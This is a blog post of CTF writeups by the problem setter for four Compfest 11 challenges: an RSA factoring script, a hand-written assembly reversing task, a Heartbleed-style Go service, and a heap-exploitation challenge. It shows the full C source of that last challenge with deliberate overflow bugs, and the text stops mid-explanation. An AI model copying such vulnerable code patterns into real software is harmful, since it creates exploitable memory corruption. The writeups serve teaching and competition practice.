---
layout: post
author: zafirr
title:  "[Long Overdue] CTF Compfest 11 Writeups"
description: Sorry :v
date: 2019-11-13
last_modified_at: 2019-11-13
categories: writeup
lang: en
tags:
    - ctf
    - compfest
---

## English
CTF Compfest 11 was the first time I've ever became a problem setter for any programming based competition. I ended up making 4 problems, 3 for qualifiers and 1 for finals. I will be explaining how to solve all problems in this post.

## 1. Optimus Prime (Cryptography)
All files needed to solve this problem can be found [here](https://drive.google.com/open?id=1pptFStC7o6BO7Xie8YucUzQ1WH2yY55I)

Optimus prime is an [RSA](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) focused problem. Players were given two files, nums.txt and rsa.txt. The file rsa.txt consisted of 2 numbers, which were the public exponent (e) and the ciphertext (c). Now if you know anything about RSA, you would know that a modulus (N) is required. In this problem, the modulus N was hidden within the file nums.txt. The file nums.txt consisted of 10^7 random numbers, but unlike how most problems would be designed, the 10^7 numbers within nums.txt did not include the modulus (N).

So where is the modulus? Rather than having the modulus in nums.txt, I put the 2 prime numbers that form N inside nums.txt. Now you may be thinking, if I need to brute 2 prime numbers out of 10^7 numbers, I would need to do 10^14 computations, which would take a super long time!

Ok before talking about the solution let's look into a few numbers in nums.txt first.

![Error](/assets/images/Optimus-Prime-1.png)

It might not seem obvious at first, below is the solution.

To solve this problem, a little insight is needed, which is that the factors that make up N are PRIME! And unlike pure bruteforcing, using something like [Fermat primality test](https://en.wikipedia.org/wiki/Fermat_primality_test) or [Miller-Rabin primality test](https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test) is super fast. According to [StackOverflow](https://math.stackexchange.com/questions/379592/computing-the-running-time-of-the-fermat-primality-test), the complexity of the fermat primality test is O(k * log n * log n * log n), which is really fast. Also, the probabilty of getting a Carmichael number is really low, around 0.00000017, so the number of possible primes that remain out of 10^7 numbers should be pretty low.

Originally I wanted to make this problem with only 2 primes inside nums.txt, but because of a small change I ended up putting around 1300 primes inside nums.txt, it doesn't really matter to be honest, since bruteforcing 10^3\*10^3 is very much possible.

Here's the script I used to solve this problem

```python


import random
import sys

print 'Finding likely primes...'

print 'Step 1: regular division testing'

divisors = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47]

with open('nums.txt', 'r') as f, open('newnums.txt', 'w') as l:
	nums = f.readlines()
	for num in nums:
		num = int(num)
		hehe = True
		for i in divisors:
			if num % i == 0:
				hehe = False
		if hehe:
			l.write(str(num) + '\n')

print 'Step 1 Complete!'
print

print 'Step 2: Fermat testing...'

nums = []
with open('newnums.txt', 'r') as f:
	nums = f.readlines()

def fermat_test(n):
	# Implementation uses the Fermat Primality Test
	n = int(n)
	for i in range(40):
		a = random.randint(1, n-1)
		if pow(a, n-1, n) != 1:
			return False
	return True

with open('likely_primes.txt', 'w') as f:
	for i in nums:
		if fermat_test(i):
			f.write(str(i))

print 'Step 2 Complete!!!'

print '=================='

print 'Got likely primes!'
print

print 'Solving RSA...'
# solve rsa
nums = []
with open('likely_primes.txt', 'r') as f:
	nums = f.readlines()

def solve_rsa(p, q, e, c):
	
	def egcd(a, b):
		if a == 0:
			return (b, 0, 1)
		else:
			g, y, x = egcd(b % a, a)
			return (g, x - (b // a) * y, y)

	def modinv(a, m):
		g, x, y = egcd(a, m)
		if g != 1:
			return 1
		else:
			return x % m

	p = int(p)
	q = int(q)
	n = p*q
	x = (p-1)*(q-1)
	d = modinv(e, x)

	a = pow(c, d, n)
	a = hex(a)[2:-1]
	try:
		msg = a.decode('hex')
	except:
		msg = ''
	return msg

with open('rsa.txt', 'r') as f:
	e = int(f.readline()[3:])
	c = int(f.readline()[3:])

counter = 1
for i in range(len(nums)):
	print 'Testing pair {}'.format(counter)
	counter += 1
	for j in range(i+1, len(nums)):
		if nums[i] == '\n' or nums[j] == '\n':
			continue
		else:
			msg = solve_rsa(nums[i], nums[j], e, c)
			if 'COMPFEST11' in msg:
				print '='*20
				print 'Flag:', msg
				print '='*20
				sys.exit(0)
```

Running the above script should give the flag

Flag: COMPFEST11{z4fIRr_i5_aW3s0me_ya}

<br>
<br>
<br>

## 2. red pill or blue pill (Reversing)
All files needed to solve this problem can be found [here](https://drive.google.com/open?id=1pptFStC7o6BO7Xie8YucUzQ1WH2yY55I)

I'm actually most proud of this problem, it was the first time I've coded in pure nasm :).

When running the binary, players are givin no prompt :P, but trying to input something will output a short string. By now people start disassembling, but because of how bad I wrote the code, it's pretty hard :P. Neither ghidra nor IDA output pretty decompilation, so dissasembly is the way to go, pure gdb!

Possible output:

![Error](/assets/images/red-pill-or-blue-pill-1.png)

disassembly:

```
   0x8049000:	xor    eax,eax
   0x8049002:	xor    ebx,ebx
   0x8049004:	xor    ecx,ecx
   0x8049006:	xor    edx,edx
   0x8049008:	mov    eax,0x3
   0x804900d:	mov    ebx,0x0
   0x8049012:	mov    ecx,0x804a000
   0x8049017:	mov    edx,0x100
   0x804901c:	int    0x80
   0x804901e:	mov    ebp,esp
   0x8049020:	mov    DWORD PTR [ebp+0x4],0xffffffff
   0x8049027:	add    DWORD PTR [ebp+0x4],0x1
   0x804902b:	mov    eax,DWORD PTR [ebp+0x4]
   0x804902e:	mov    eax,DWORD PTR [eax+0x804a000]
   0x8049034:	test   eax,eax
   0x8049036:	jne    0x8049027
   0x8049038:	mov    eax,DWORD PTR [ebp+0x4]
   0x804903b:	cmp    eax,0x1d
   0x804903e:	je     0x8049045
   0x8049040:	jmp    0x804910e
   0x8049045:	mov    DWORD PTR [ebp+0x4],0xffffffff
   0x804904c:	mov    DWORD PTR [ebp+0x10],0x7f
   0x8049053:	jmp    0x80490ad
   0x8049055:	mov    DWORD PTR [ebp+0x8],0xffffffff
   0x804905c:	mov    DWORD PTR [ebp+0xc],0x0
   0x8049063:	mov    ebx,DWORD PTR [ebp+0x4]
   0x8049066:	jmp    0x8049097
   0x8049068:	xor    eax,eax
   0x804906a:	mov    al,BYTE PTR [ebp+0x8]
   0x804906d:	mov    ecx,0x1d
   0x8049072:	imul   ecx
   0x8049074:	mov    ecx,eax
   0x8049076:	mov    dl,BYTE PTR [ebx+ecx*1+0x804a100]
   0x804907d:	xor    ecx,ecx
   0x804907f:	mov    ecx,DWORD PTR [ebp+0x8]
   0x8049082:	mov    al,BYTE PTR [ecx+0x804a000]
   0x8049088:	imul   dl
   0x804908a:	add    DWORD PTR [ebp+0xc],eax
   0x804908d:	mov    eax,DWORD PTR [ebp+0xc]
   0x8049090:	cdq    
   0x8049091:	idiv   DWORD PTR [ebp+0x10]
   0x8049094:	mov    DWORD PTR [ebp+0xc],edx
   0x8049097:	add    DWORD PTR [ebp+0x8],0x1
   0x804909b:	mov    eax,DWORD PTR [ebp+0x8]
   0x804909e:	cmp    eax,0x1d
   0x80490a1:	jl     0x8049068
   0x80490a3:	mov    eax,DWORD PTR [ebp+0xc]
   0x80490a6:	mov    ebx,DWORD PTR [ebp+0x4]
   0x80490a9:	mov    DWORD PTR [ebp+ebx*1+0x14],eax
   0x80490ad:	add    DWORD PTR [ebp+0x4],0x1
   0x80490b1:	mov    eax,DWORD PTR [ebp+0x4]
   0x80490b4:	cmp    eax,0x1d
   0x80490b7:	jl     0x8049055
   0x80490b9:	jmp    0x80490eb
   0x80490bb:	mov    eax,0x4
   0x80490c0:	mov    ebx,0x1
   0x80490c5:	mov    ecx,0x804a449
   0x80490ca:	mov    edx,0xa
   0x80490cf:	int    0x80
   0x80490d1:	jmp    0x8049126
   0x80490d3:	mov    eax,0x4
   0x80490d8:	mov    ebx,0x1
   0x80490dd:	mov    ecx,0x804a453
   0x80490e2:	mov    edx,0xe
   0x80490e7:	int    0x80
   0x80490e9:	jmp    0x8049126
   0x80490eb:	mov    DWORD PTR [ebp+0x4],0xffffffff
   0x80490f2:	jmp    0x8049100
   0x80490f4:	mov    al,BYTE PTR [ecx+0x804a478]
   0x80490fa:	cmp    al,BYTE PTR [ebp+ecx*1+0x14]
   0x80490fe:	jne    0x80490d3
   0x8049100:	add    DWORD PTR [ebp+0x4],0x1
   0x8049104:	mov    ecx,DWORD PTR [ebp+0x4]
   0x8049107:	cmp    ecx,0x1d
   0x804910a:	jl     0x80490f4
   0x804910c:	jmp    0x80490bb
   0x804910e:	mov    eax,0x4
   0x8049113:	mov    ebx,0x1
   0x8049118:	mov    ecx,0x804a461
   0x804911d:	mov    edx,0x17
   0x8049122:	int    0x80
   0x8049124:	jmp    0x8049126
   0x8049126:	mov    eax,0x1
   0x804912b:	int    0x80
```

To be honest it doesn't look that hard, only 84 lines of pure ugly assembly, really weird how only 3 teams solved it.

### The Syscalls
If you know anything about how assembly works, you would know doing some stuff like I/O requires [syscalls](https://en.wikipedia.org/wiki/System_call). Since this is a 32-bit binary, syscalls are invoked using the `int 0x80` instruction. Ok lets break down a few instructions then

this is setup dan reading input. Input is placed at the buffer 0x804a000

```
   0x8049000:  xor    eax,eax
   0x8049002:  xor    ebx,ebx
   0x8049004:  xor    ecx,ecx
   0x8049006:  xor    edx,edx
   0x8049008:  mov    eax,0x3
   0x804900d:  mov    ebx,0x0
   0x8049012:  mov    ecx,0x804a000
   0x8049017:  mov    edx,0x100
   0x804901c:  int    0x80
```

this prints whatever is at 0x804a449

```
   0x80490bb:  mov    eax,0x4
   0x80490c0:  mov    ebx,0x1
   0x80490c5:  mov    ecx,0x804a449
   0x80490ca:  mov    edx,0xa
   0x80490cf:  int    0x80
```

this prints whatever is at 0x804a453

```
   0x80490d3:  mov    eax,0x4
   0x80490d8:  mov    ebx,0x1
   0x80490dd:  mov    ecx,0x804a453
   0x80490e2:  mov    edx,0xe
   0x80490e7:  int    0x80
```

this prints whatever is at 0x804a461

```
   0x804910e:  mov    eax,0x4
   0x8049113:  mov    ebx,0x1
   0x8049118:  mov    ecx,0x804a461
   0x804911d:  mov    edx,0x17
   0x8049122:  int    0x80
```

and this exits

```
   0x8049126:  mov    eax,0x1
   0x804912b:  int    0x80
```

Simple stuff right? Well whatever is left is what we need to reverse

### Lets start cracking
Ok lets look at the main logic

```
   0x804901e:  mov    ebp,esp
   0x8049020:  mov    DWORD PTR [ebp+0x4],0xffffffff
   0x8049027:  add    DWORD PTR [ebp+0x4],0x1
   0x804902b:  mov    eax,DWORD PTR [ebp+0x4]
   0x804902e:  mov    eax,DWORD PTR [eax+0x804a000]
   0x8049034:  test   eax,eax
   0x8049036:  jne    0x8049027
   0x8049038:  mov    eax,DWORD PTR [ebp+0x4]
   0x804903b:  cmp    eax,0x1d
   0x804903e:  je     0x8049045
   0x8049040:  jmp    0x804910e
   0x8049045:  mov    DWORD PTR [ebp+0x4],0xffffffff
   0x804904c:  mov    DWORD PTR [ebp+0x10],0x7f
   0x8049053:  jmp    0x80490ad
   0x8049055:  mov    DWORD PTR [ebp+0x8],0xffffffff
   0x804905c:  mov    DWORD PTR [ebp+0xc],0x0
   0x8049063:  mov    ebx,DWORD PTR [ebp+0x4]
   0x8049066:  jmp    0x8049097
   0x8049068:  xor    eax,eax
   0x804906a:  mov    al,BYTE PTR [ebp+0x8]
   0x804906d:  mov    ecx,0x1d
   0x8049072:  imul   ecx
   0x8049074:  mov    ecx,eax
   0x8049076:  mov    dl,BYTE PTR [ebx+ecx*1+0x804a100]
   0x804907d:  xor    ecx,ecx
   0x804907f:  mov    ecx,DWORD PTR [ebp+0x8]
   0x8049082:  mov    al,BYTE PTR [ecx+0x804a000]
   0x8049088:  imul   dl
   0x804908a:  add    DWORD PTR [ebp+0xc],eax
   0x804908d:  mov    eax,DWORD PTR [ebp+0xc]
   0x8049090:  cdq    
   0x8049091:  idiv   DWORD PTR [ebp+0x10]
   0x8049094:  mov    DWORD PTR [ebp+0xc],edx
   0x8049097:  add    DWORD PTR [ebp+0x8],0x1
   0x804909b:  mov    eax,DWORD PTR [ebp+0x8]
   0x804909e:  cmp    eax,0x1d
   0x80490a1:  jl     0x8049068
   0x80490a3:  mov    eax,DWORD PTR [ebp+0xc]
   0x80490a6:  mov    ebx,DWORD PTR [ebp+0x4]
   0x80490a9:  mov    DWORD PTR [ebp+ebx*1+0x14],eax
   0x80490ad:  add    DWORD PTR [ebp+0x4],0x1
   0x80490b1:  mov    eax,DWORD PTR [ebp+0x4]
   0x80490b4:  cmp    eax,0x1d
   0x80490b7:  jl     0x8049055
```

You may need a little experience with assembly, but everything excluding 0x8049068 to 0x8049094 is a loop, more specifically a nested loop that goes from -1 to 29 (exclusive). So if we try to write it as python [pseudocode](https://en.wikipedia.org/wiki/Pseudocode), we get:

```python
for i in range(0, 29):
   for j in range(0, 29):
      <do something>
```

Now im not a compiler, so the loops didnt come out as amazing as gcc does it. But hey its okay I guess.

### What is \<do something\>
So we know its a nested loop that runs from -1 to 29 (exclusive), but what happens inside the loops? Well lets take a look at this instruction:

```
   0x8049076:  mov    dl,BYTE PTR [ebx+ecx*1+0x804a100]
```

If we say ebx and ecx both have small numbers, this is basically referencing some value in 0x804a100 and storing it in dl. With some experience, notation like this is usually an indication of matrix accessing. So the nested loop accesses a matrix, now our pseudocode becomes:

```python
for i in range(0, 29):
   for j in range(0, 29):
      matrix[i*29 + j]
```

Now there are 2 more instructions to look at, those are:

```
   0x8049088:  imul   dl
   .
   .
   .
   0x8049091:  idiv   DWORD PTR [ebp+0x10]
```

`imul` is multiply, and `idiv` is divide, but with what? According to the [nasm docs](http://home.myfairpoint.net/fbkotler/nasmdocr.html), `imul` multiplys the value givin with the value in al/dx:ax/edx:eax and stores the value in al/dx:ax/edx:eax. Since we are multiplying with dl, the value is multiplied with al and stored in al. `idiv` is almost the same, the value is divided with al/dx:ax/edx:eax, and the result is stored in al/ax/eax and the remainder is stored in ah/dx/edx. Since were are dividing with a DWORD, the result is in eax and the remainder is in edx.

We know from the previous instruction that dl is the value in the matrix, but what about the value of al? We can find that here:

```
   0x804907d:  xor    ecx,ecx
   0x804907f:  mov    ecx,DWORD PTR [ebp+0x8]
   0x8049082:  mov    al,BYTE PTR [ecx+0x804a000]
```

Oh. al is the value we inputted. We also know from one of the instructions when setting up the loop that the value in [ebp+0x10] is 0x7f, so the result of the multiplication is divided by 0x7f, neat.

So why did we do a divide? Let's look into the next instructions:

```
   0x8049091:  idiv   DWORD PTR [ebp+0x10]
   0x8049094:  mov    DWORD PTR [ebp+0xc],edx
``` 

Oh so the value of edx is the one thats used, which is the remainder of the division. The value is then stored with these instructions:

```
   0x80490a3:  mov    eax,DWORD PTR [ebp+0xc]
   0x80490a6:  mov    ebx,DWORD PTR [ebp+0x4]
   0x80490a9:  mov    DWORD PTR [ebp+ebx*1+0x14],eax
```

So now out pseudocode becomes this:

```python
for i in range(0, 29):
   for j in range(0, 29):
      result[i] = (matrix[i*29 + j] * password[i]) % 0x7f
```

### So what now
Well we now know that there was some matrix multiplication that happened and the value was stored, but what do with do with that? Well theres one more piece of logic that we havent seen yet, which is this block of code:

```
   0x80490eb:  mov    DWORD PTR [ebp+0x4],0xffffffff
   0x80490f2:  jmp    0x8049100
   0x80490f4:  mov    al,BYTE PTR [ecx+0x804a478]
   0x80490fa:  cmp    al,BYTE PTR [ebp+ecx*1+0x14]
   0x80490fe:  jne    0x80490d3
   0x8049100:  add    DWORD PTR [ebp+0x4],0x1
   0x8049104:  mov    ecx,DWORD PTR [ebp+0x4]
   0x8049107:  cmp    ecx,0x1d
   0x804910a:  jl     0x80490f4
   0x804910c:  jmp    0x80490bb
```

This basically compares result with some data already in binary, if it is equal good if not bad. If all values are equal then what was inputted is the correct password. Done :)

Flag: COMPFEST11{ya_Its_wE1rD_z3_do3S_Not_w0Rk}

### Extra Notes:
* z3 cannot solve this, it takes forever! Use sageMath!
* the input must be perfectly 29 bytes long, null terminated, you cant input it directly because a newline is appended! :D

<br>
<br>
<br>

## 3. helloabcdefghijklmnop (Binary Exploitation)
This was my final qualifier problem, it consisted of 2 go-lang compiled binaries named "client" and "server". The binary "server" was the one running in the service, while running the binary "client" on your machine would connect with the service with a set port. Client is a knockoff messaging system which is apparently "down", but the server is still up. In order to test if the server is still up, the client can send a string, and if the same string is returned by the server, then the server is still up.

Example:

![Error](/assets/images/helloabcdefghijklmnop-1.png)

![Error](/assets/images/helloabcdefghijklmnop-2.png)

### The bug
So what's the underlying bug? Maybe this will help (source [xkcd](https://xkcd.com/1354/)):

![Error](/assets/images/helloabcdefghijklmnop-3.png)

Yes, I made a heartbleed problem. I'm not very proud of it, because I thought giving the source code would be too easy, and not giving it would be hard. I ended up not giving it, but the problem became really reverse heavy because you had to understand how go-lang compiles its binary, aswell as how go-lang saves its variables.

I'll explain a little just to help.

### Go-lang
Go-lang saves almost allocates all its variables on the stack, including function arguments and return values. This is the part of the reason why decompilers become confused and aren't really pretty in decompilation, and also seeing disassembly is a pain in and of itself. But the way I hoped teams would solve it is by looking at the disassembly, I was wrong. Let's look at some disassembly of the main function in the "client" binary. Not all of it, just the important parts

```
  4dcd11:  48 8d 0d 48 d2 05 00    lea    0x5d248(%rip),%rcx        # 539f60 <go.itab.*os.File,io.Reader>
  4dcd18:   48 89 8c 24 98 03 00    mov    %rcx,0x398(%rsp)
  4dcd1f:   00 
  4dcd20:   48 89 84 24 a0 03 00    mov    %rax,0x3a0(%rsp)
  4dcd27:   00 
  4dcd28:   48 8d 05 71 e4 04 00    lea    0x4e471(%rip),%rax        # 52b1a0 <go.func.*+0x2>
  4dcd2f:   48 89 84 24 a8 03 00    mov    %rax,0x3a8(%rsp)
  4dcd36:   00 
  4dcd37:   48 c7 84 24 b0 03 00    movq   $0x10000,0x3b0(%rsp)
  4dcd3e:   00 00 00 01 00 
  4dcd43:   48 8d 94 24 98 03 00    lea    0x398(%rsp),%rdx
  4dcd4a:   00 
  4dcd4b:   48 89 14 24             mov    %rdx,(%rsp)
  4dcd4f:   e8 0c eb ff ff          callq  4db860 <bufio.(*Scanner).Scan>
  4dcd54:   48 8b 84 24 b8 03 00    mov    0x3b8(%rsp),%rax
  4dcd5b:   00 
  4dcd5c:   48 8b 8c 24 c0 03 00    mov    0x3c0(%rsp),%rcx
  4dcd63:   00 
  4dcd64:   48 8b 94 24 c8 03 00    mov    0x3c8(%rsp),%rdx
  4dcd6b:   00 
  4dcd6c:   48 89 44 24 08          mov    %rax,0x8(%rsp)
  4dcd71:   48 89 4c 24 10          mov    %rcx,0x10(%rsp)
  4dcd76:   48 89 54 24 18          mov    %rdx,0x18(%rsp)
  4dcd7b:   48 c7 04 24 00 00 00    movq   $0x0,(%rsp)
  4dcd82:   00 
  4dcd83:   e8 18 59 f6 ff          callq  4426a0 <runtime.slicebytetostring>
  4dcd88:   48 8b 44 24 28          mov    0x28(%rsp),%rax
  4dcd8d:   48 89 44 24 58          mov    %rax,0x58(%rsp)
  4dcd92:   48 8b 4c 24 20          mov    0x20(%rsp),%rcx
  4dcd97:   48 89 8c 24 b8 01 00    mov    %rcx,0x1b8(%rsp)
  4dcd9e:   00 
  4dcd9f:   48 8d 94 24 20 01 00    lea    0x120(%rsp),%rdx
  4dcda6:   00 
  4dcda7:   48 89 14 24             mov    %rdx,(%rsp)
  4dcdab:   48 89 4c 24 08          mov    %rcx,0x8(%rsp)
  4dcdb0:   48 89 44 24 10          mov    %rax,0x10(%rsp)
  4dcdb5:   e8 26 5b f6 ff          callq  4428e0 <runtime.stringtoslicerune>
  4dcdba:   0f b7 44 24 20          movzwl 0x20(%rsp),%eax
  4dcdbf:   48 8d 4c 24 44          lea    0x44(%rsp),%rcx
  4dcdc4:   48 89 0c 24             mov    %rcx,(%rsp)
  4dcdc8:   48 89 44 24 08          mov    %rax,0x8(%rsp)
  4dcdcd:   e8 5e 5e f6 ff          callq  442c30 <runtime.intstring>
  4dcdd2:   48 8b 44 24 18          mov    0x18(%rsp),%rax
  4dcdd7:   48 8b 4c 24 10          mov    0x10(%rsp),%rcx
  4dcddc:   48 89 4c 24 08          mov    %rcx,0x8(%rsp)
  4dcde1:   48 89 44 24 10          mov    %rax,0x10(%rsp)
  4dcde6:   48 8d 84 24 80 00 00    lea    0x80(%rsp),%rax
  4dcded:   00 
  4dcdee:   48 89 04 24             mov    %rax,(%rsp)
  4dcdf2:   48 8b 84 24 b8 01 00    mov    0x1b8(%rsp),%rax
  4dcdf9:   00 
  4dcdfa:   48 89 44 24 18          mov    %rax,0x18(%rsp)
  4dcdff:   48 8b 4c 24 58          mov    0x58(%rsp),%rcx
  4dce04:   48 89 4c 24 20          mov    %rcx,0x20(%rsp)
  4dce09:   e8 b2 56 f6 ff          callq  4424c0 <runtime.concatstring2>
  4dce0e:   48 8b 44 24 30          mov    0x30(%rsp),%rax
  4dce13:   48 89 44 24 48          mov    %rax,0x48(%rsp)
  4dce18:   48 8b 4c 24 28          mov    0x28(%rsp),%rcx
  4dce1d:   48 89 8c 24 a0 01 00    mov    %rcx,0x1a0(%rsp)
  4dce24:   00 
  4dce25:   48 8b 94 24 b8 01 00    mov    0x1b8(%rsp),%rdx
  4dce2c:   00 
  4dce2d:   48 89 94 24 58 02 00    mov    %rdx,0x258(%rsp)
  4dce34:   00 
  4dce35:   48 8b 5c 24 58          mov    0x58(%rsp),%rbx
  4dce3a:   48 89 9c 24 60 02 00    mov    %rbx,0x260(%rsp)
  4dce41:   00 
  4dce42:   0f 57 c0                xorps  %xmm0,%xmm0
  4dce45:   0f 11 84 24 68 02 00    movups %xmm0,0x268(%rsp)
  4dce4d:   48 8d 35 2c 71 01 00    lea    0x1712c(%rip),%rsi        # 4f3f80 <type.*+0x15d60>
  4dce54:   48 89 34 24             mov    %rsi,(%rsp)
  4dce58:   48 8d bc 24 58 02 00    lea    0x258(%rsp),%rdi
  4dce5f:   00 
  4dce60:   48 89 7c 24 08          mov    %rdi,0x8(%rsp)
  4dce65:   e8 66 1c f3 ff          callq  40ead0 <runtime.convT2Estring>
```

Oh god what is this, most of it isn't important, just look at the functions used.

```
  4dcd11:  48 8d 0d 48 d2 05 00    lea    0x5d248(%rip),%rcx        # 539f60 <go.itab.*os.File,io.Reader>
   .
   .
  4dcd28:   48 8d 05 71 e4 04 00    lea    0x4e471(%rip),%rax        # 52b1a0 <go.func.*+0x2>
   .
   .
  4dcd4f:   e8 0c eb ff ff          callq  4db860 <bufio.(*Scanner).Scan>
   .
   .
  4dcd83:   e8 18 59 f6 ff          callq  4426a0 <runtime.slicebytetostring>
   .
   .
  4dcdb5:   e8 26 5b f6 ff          callq  4428e0 <runtime.stringtoslicerune>
   .
   .
  4dcdcd:   e8 5e 5e f6 ff          callq  442c30 <runtime.intstring>
   .
   .
  4dce09:   e8 b2 56 f6 ff          callq  4424c0 <runtime.concatstring2>
   .
   .
  4dce65:   e8 66 1c f3 ff          callq  40ead0 <runtime.convT2Estring>
```

Okay it might take a little experience and a little while to google, but these functions basically do this:
*  read input
*  string becomes a array of "runes"
*  get length of it
*  length becomes a "rune"
*  add length to array of "runes"
*  array of runes becomes string again

Okay it should be clear what you have to do, just change the length to a large number and important data will be sent back, important data being the flag.

Flag: COMPFEST11{ya_heartbleed_was_cool_and_all}

### Feedback to myself
Next time i'll make the logic harder, but give the source, it seems like the better option instead of easy logic but no source. No team solved this problem .-.

<br>
<br>
<br>

## 4. Fruity Goodness (Binary Exploitation)
All files needed to solve this problem can be found [here](https://drive.google.com/open?id=1pptFStC7o6BO7Xie8YucUzQ1WH2yY55I)

Fruity goodness is a heap-based Binary Exploitation problem that took most its inspiration from the [House of Orange](https://1ce0ear.github.io/2017/11/26/study-house-of-orange/) Exploit. I wanted to make this problem reflect a [Pokemon](https://www.pokemon.com/us/) game, I kinda succeded I guess (?)

Lets look at the source code (it was given since compfest finals were in the Attack-Defence format):

```c
   #include<stdio.h>
   #include<stdlib.h>
   #include<string.h>
   #include<signal.h>
   #include<time.h>

   struct Fruit
   {
      int coolness;
      int tastiness;
      int number;
      char *name;
      struct Fruit *next_fruit;
      int level;
   };

   int number_of_fruits = 0;
   struct Fruit *newest_fruit = NULL;
   struct Fruit *first_fruit = NULL;

   void timeout()
   {
      puts("Sorry thats it for the demo!");
      exit(0);
   }

   void flusher()
   {
      fflush(stdin);
      fflush(stdout);
      fflush(stderr);
   }

   void setup()
   {
      signal(SIGALRM, timeout);
      alarm(150);
      setvbuf(stdin, NULL, _IONBF, 0);
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
      srand(time(NULL));
      puts("==================================================");
      puts("WELCOME TO FRUIT WAR v6.9");
      puts("I'm still a noob C coder :(, please report any bugs you find");
      puts("I'm also poor so i cant pay you :(");
      puts("Hopefully you have fun!");
      puts("==================================================");
   }

   void menu()
   {
      flusher();
      puts("1. I want a new fruit");
      puts("2. I want to train my fruit");
      puts("3. I want to list all my fruits");
      puts("4. I want out :(");
      puts("Your choice:");
      return;
   }

   void make_fruit()
   {  
      if(number_of_fruits > 5)   {
         puts("Sorry... We only have the resources for 5 fruits...");
         exit(-1);
      }
      struct Fruit *new_fruit = malloc(sizeof(struct Fruit));
      new_fruit->coolness = 0;
      new_fruit->tastiness = 0;
      new_fruit->level = 0;
      new_fruit->number = number_of_fruits;
      if(number_of_fruits == 0)  {
         first_fruit = new_fruit;
      }
      else  {
         newest_fruit->next_fruit = new_fruit;
      }
      newest_fruit = new_fruit;
      puts("How long do you want this fruit's name to be? (Max 4096 characters)");
      int length;
      scanf("%d", &length);
      getchar();
      if(length > 4096) {
         puts("NO! BAD!");
         exit(-1);
      }
      char new_name[length];
      puts("What do you want this fruit's name to be?");
      fgets(new_name, length, stdin);
      new_fruit->name = malloc(length);
      strncpy(new_fruit->name, new_name, length);
      number_of_fruits++;
      puts("Fruit Made!");
      return;
   }

   struct Fruit *get_fruit(int fruit_number) {
      struct Fruit *temp = first_fruit;
      for(int i = 0; i < fruit_number; i++)  {
         temp = temp->next_fruit;
         if(temp == NULL)  {
            puts("Something went wrong!");
            exit(-1);
         }
      }
      return temp;
   }

   void evolve_berry()  {
      usleep(1000000);
      for(int i = 0; i < 10; i++)   {
         puts(".");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
         puts("/\\");
         puts("\\/");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
      }
      puts("Congratz your fruit evolved into a berry!");
      return;
   }

   void evolve_apple()  {
      usleep(1000000);
      for(int i = 0; i < 10; i++)   {
         puts("/\\");
         puts("\\/");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
         puts(" ,(.");
         puts("(   )");
         puts(" `\"'");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
      }
      puts("Congratz your fruit evolved into an apple!");
      return;
   }

   void evolve_orange() {
      usleep(1000000);
      for(int i = 0; i < 10; i++)   {
         puts(" ,(.");
         puts("(   )");
         puts(" `\"'");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
         puts("  ,--./,-.");
         puts(" / #      \\");
         puts("|          |");
         puts(" \\        /");
         puts("  `.____,'");
         for(int j = 0; j < 20; j++)
            puts("");
         usleep(400000);
      }
      puts("Congratz your fruit evolved into an orange!");
      return;
   }

   void train_fruit()
   {
      int fruit_number;

      printf("You have %d fruits\n", number_of_fruits);
      puts("Which fruit do you want to train?");
      scanf("%d", &fruit_number);
      getchar();
      if(0 > fruit_number || number_of_fruits-1 < fruit_number)   {
         puts("That fruit doesnt exist yet...");
         return;
      }
      struct Fruit *fruit_to_train = get_fruit(fruit_number);
      if(fruit_to_train->level >= 3)   {
         puts("This fruit can no longer train!");
         return;
      }
      fruit_to_train->coolness += rand() % 10 + 1;
      fruit_to_train->tastiness += rand() % 10 + 1;
      if(fruit_to_train->coolness >= 50 && fruit_to_train->tastiness >= 50)   {
         fruit_to_train->coolness = 0;
         fruit_to_train->tastiness = 0;
         puts("Whats this? This fruit is evolving?!");
         if(fruit_to_train->level == 0)   {
            evolve_berry();
         }
         else if(fruit_to_train->level == 1) {
            evolve_apple();
         }
         else if(fruit_to_train->level == 2) {
            evolve_orange();
         }
         fruit_to_train->level++;
         puts("Would you like to rename this fruit? (y/n)");
         char choice[5];
         fgets(choice, 5, stdin);
         if(strstr(choice, "y")) {
            puts("How long do you want this fruit's name to be? (Max 4096 characters)");
            int length;
            scanf("%d", &length);
            getchar();
            if(length > 4096) {
               puts("NO! BAD!");
               exit(-1);
            }
            char new_name[length];
            puts("What do you want this fruit's name to be?");
            __read_chk(0, new_name, length);
            strncpy(fruit_to_train->name, new_name, length);
            return;
         }
         else if(strstr(choice, "n"))  {
            puts("Okay then");
            return;
         }
         else  {
            puts("Dont play games with me >:(");
            exit(-1);
         }
      }
      puts("Fruit Trained!");
      return;
   }

   void print_fruit(struct Fruit *fruit_to_print)
   {
      puts("==================================================");
      printf("Number: %d\n", fruit_to_print->number);
      printf("Name: %s", fruit_to_print->name);
      printf("Coolness: %d\n", fruit_to_print->coolness);
      printf("Tastiness: %d\n", fruit_to_print->tastiness);
      printf("Level: %d\n", fruit_to_print->level);
      puts("==================================================");
      return;  
   }

   void list_fruits()
   {
      if(number_of_fruits == 0)  {
         puts("You have no fruits yet silly!");
         return;
      }
      struct Fruit *fruit_to_print = first_fruit;
      while(fruit_to_print->next_fruit != NULL) {
         print_fruit(fruit_to_print);
         fruit_to_print = fruit_to_print->next_fruit;
      }
      print_fruit(fruit_to_print);
      return;
   }

   int main(int argc, char* argv[], char** env)
   {
      setup();
      int choice;
      while(1) {
         menu();
         scanf("%d", &choice);
         getchar();
         if(choice == 1)   {
            make_fruit();
         }
         else if (choice == 2)   {
            train_fruit();
         }
         else if (choice == 3)   {
            list_fruits();
         }
         else  {
            puts("You gave up on your fruits..."); exit(0);
         }
      }
   }
```

Seems like alot, but its a basic make/edit/see kind of problem. I'll leave it up to you to understand how it works, here's a summary though

* make_fruit -> You can make a new fruit which has a coolness, tastiness, number, name, pointer to next fruit and level
